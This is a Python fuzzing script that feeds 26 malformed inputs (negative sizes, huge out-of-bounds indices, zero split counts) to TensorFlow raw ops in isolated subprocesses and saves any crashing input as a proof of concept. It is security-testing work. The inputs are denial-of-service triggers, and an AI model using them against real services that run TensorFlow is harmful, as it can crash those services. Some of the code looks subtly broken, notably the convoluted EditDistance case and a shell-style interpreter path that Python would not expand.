#!/usr/bin/env python3
"""dast_sweep.py — black-box crash sweep over the target's op surface.

Reasoning (no identity/version knowledge used): the highest-risk surface in a native
numeric library is the set of thin op wrappers that pass caller-controlled shape / index /
segment / split metadata into C++ kernels. We feed each a degenerate/adversarial input and
run it in an ISOLATED subprocess: a process-level signal (SIGSEGV/SIGABRT/SIGFPE) or a
"Check failed" abort is a real defect (DoS / memory-safety), whereas a normal Python
exception is contractual and NOT a bug.

Each CASE is a self-contained snippet. Output: a JSONL of results; crashers are saved as PoCs.
"""
import json, os, subprocess, sys, signal, textwrap

PY = "${AIVH_PY:-python3}"
OUT = "<REPO>/findings/raw/dast"
os.makedirs(OUT, exist_ok=True)

PRE = "import os;os.environ['TF_CPP_MIN_LOG_LEVEL']='3';os.environ['CUDA_VISIBLE_DEVICES']='-1';import tensorflow as tf,numpy as np\n"

# (id, category, hypothesis, code) — reasoned adversarial inputs to index/shape/segment ops.
CASES = [
 ("seg-unsorted-negnum","segment","UnsortedSegmentSum: num_segments negative -> unchecked alloc/index",
  "tf.raw_ops.UnsortedSegmentSum(data=tf.ones([3]),segment_ids=tf.constant([0,1,2]),num_segments=-5)"),
 ("seg-ids-oob","segment","UnsortedSegmentProd: segment id >> num_segments",
  "tf.raw_ops.UnsortedSegmentProd(data=tf.ones([2]),segment_ids=tf.constant([0,2**30]),num_segments=1)"),
 ("sparse-reshape-mismatch","sparse","SparseReshape: product mismatch / overflow",
  "tf.raw_ops.SparseReshape(input_indices=[[0,0]],input_shape=[3,4],new_shape=[-1,-1])"),
 ("sparse-split-numsplit0","sparse","SparseSplit: num_split=0 -> div by zero",
  "tf.raw_ops.SparseSplit(split_dim=0,indices=[[0,0]],values=[1.0],shape=[2,2],num_split=0)"),
 ("ragged-splits-bad","ragged","RaggedTensorToTensor: decreasing row splits",
  "tf.raw_ops.RaggedTensorToTensor(shape=[3,3],values=tf.range(3),default_value=0,row_partition_tensors=[tf.constant([0,2,1,3])],row_partition_types=['ROW_SPLITS'])"),
 ("tensorlist-reserve-neg","tensorlist","TensorListReserve: negative num_elements",
  "tf.raw_ops.TensorListReserve(element_shape=[],element_dtype=tf.float32,num_elements=-1)"),
 ("tensorlist-split-neglen","tensorlist","TensorListSplit: negative lengths",
  "tf.raw_ops.TensorListSplit(tensor=tf.ones([4]),element_shape=[-1],lengths=[-4,8])"),
 ("bincount-neg-size","bincount","Bincount: negative size",
  "tf.raw_ops.Bincount(arr=tf.constant([0,1,2]),size=-5,weights=[])"),
 ("densebincount-neg","bincount","DenseBincount: negative size",
  "tf.raw_ops.DenseBincount(input=tf.constant([0,1]),size=-1,weights=[],binary_output=False)"),
 ("scatternd-neg-shape","scatter","ScatterNd: negative output shape",
  "tf.raw_ops.ScatterNd(indices=[[0]],updates=[1.0],shape=[-3])"),
 ("tensorscatter-oob","scatter","TensorScatterUpdate: OOB index",
  "tf.raw_ops.TensorScatterUpdate(tensor=tf.zeros([3]),indices=[[2**30]],updates=[1.0])"),
 ("gathernd-oob","gather","GatherNd: OOB index",
  "tf.raw_ops.GatherNd(params=tf.zeros([3]),indices=[[2**30]])"),
 ("reshape-overflow","reshape","Reshape: overflowing dim product",
  "tf.raw_ops.Reshape(tensor=tf.ones([4]),shape=[2**40,2**40])"),
 ("broadcastto-neg","reshape","BroadcastTo: negative shape",
  "tf.raw_ops.BroadcastTo(input=tf.ones([3]),shape=[-1,3])"),
 ("matrixdiag-bad-k","linalg","MatrixDiagV2: extreme k / dims",
  "tf.raw_ops.MatrixDiagV2(diagonal=tf.ones([3]),k=2**30,num_rows=-1,num_cols=-1,padding_value=0.0)"),
 ("fractionalmaxpool-badratio","pool","FractionalMaxPool: pooling_ratio < 1",
  "tf.raw_ops.FractionalMaxPool(value=tf.ones([1,4,4,1]),pooling_ratio=[1.0,0.1,0.1,1.0],pseudo_random=False,overlapping=False,deterministic=False,seed=0,seed2=0)"),
 ("nthelement-neg","select","NthElement: n negative",
  "tf.raw_ops.NthElement(input=tf.ones([5]),n=-3,reverse=False)"),
 ("stringngrams-bad","string","StringNGrams: ngram_widths negative",
  "tf.raw_ops.StringNGrams(data=tf.constant(['a','b']),data_splits=tf.constant([0,2]),separator=' ',ngram_widths=[-1],left_pad='',right_pad='',pad_width=0,preserve_short_sequences=False)"),
 ("editdistance-bad","string","EditDistance: malformed sparse",
  "tf.raw_ops.EditDistance(hypothesis_indices=[[0,0]],hypothesis_values=[1],hypothesis_shape=[1,1],truncate_indices=[[0,0]] if False else [[0,0]],truncate_values=[1] if False else [1],truncate_shape=[1,1]) if False else tf.raw_ops.EditDistance(hypothesis_indices=[[0,0]],hypothesis_values=[1],hypothesis_shape=[-1,-1],truncate_indices=[[0,0]],truncate_values=[1],truncate_shape=[1,1])"),
 ("split-numsplit0","reshape","Split: num_split zero -> div by zero",
  "tf.raw_ops.Split(axis=0,value=tf.ones([4]),num_split=0)"),
 ("paramtruncnormal-badshape","random","ParameterizedTruncatedNormal: negative shape",
  "tf.raw_ops.ParameterizedTruncatedNormal(shape=[-1],means=[0.0],stdevs=[1.0],minvals=[-1.0],maxvals=[1.0])"),
 ("qad-bad","quant","QuantizeAndDequantizeV2: num_bits huge",
  "tf.raw_ops.QuantizeAndDequantizeV2(input=tf.ones([3]),input_min=0.0,input_max=1.0,signed_input=True,num_bits=2**30,range_given=True)"),
 ("sparsedensecw-bad","sparse","SparseDenseCwiseMul: malformed",
  "tf.raw_ops.SparseDenseCwiseMul(sp_indices=[[0,0]],sp_values=[1.0],sp_shape=[-1,-1],dense=tf.ones([2,2]))"),
 ("unravel-neg","reshape","UnravelIndex: dims with zero",
  "tf.raw_ops.UnravelIndex(indices=[3],dims=[0])"),
 ("lrn-bad","pool","LRN: depth_radius negative",
  "tf.raw_ops.LRN(input=tf.ones([1,2,2,4]),depth_radius=-2**20,bias=1.0,alpha=1.0,beta=0.5)"),
 ("matmul-huge","linalg","SparseTensorDenseMatMul: OOB indices",
  "tf.raw_ops.SparseTensorDenseMatMul(a_indices=[[2**30,0]],a_values=[1.0],a_shape=[1,1],b=tf.ones([1,1]))"),
]

def run_case(cid, code):
    snippet = PRE + code + "\nprint('SURVIVED')\n"
    try:
        p = subprocess.run([PY, "-c", snippet], capture_output=True, text=True, timeout=60)
        rc = p.returncode
    except subprocess.TimeoutExpired:
        return {"result":"timeout","rc":None,"signal":None,"stderr":"(timeout 60s)"}
    if rc < 0:
        return {"result":"CRASH","rc":rc,"signal":signal.Signals(-rc).name,"stderr":p.stderr[-4000:]}
    if "SURVIVED" in p.stdout and rc == 0:
        return {"result":"ok","rc":0,"signal":None,"stderr":""}
    return {"result":"exception","rc":rc,"signal":None,"stderr":p.stderr[-1500:]}

results=[]
for cid, cat, hyp, code in CASES:
    r = run_case(cid, code); r.update(id=cid,category=cat,hypothesis=hyp,code=code)
    results.append(r)
    tag = r["result"].upper()
    print(f"[{tag:9}] {cid:26} {r.get('signal') or ''}", flush=True)
    if r["result"]=="CRASH":
        open(f"{OUT}/poc_{cid}.py","w").write(PRE+code+"\n")

open(f"{OUT}/sweep_results.jsonl","w").write("\n".join(json.dumps(r) for r in results)+"\n")
crashes=[r for r in results if r["result"]=="CRASH"]
print(f"\n=== {len(crashes)} crash(es) / {len(results)} cases ===")
for r in crashes:
    print(f"  {r['id']}: {r['signal']} — {r['hypothesis']}")
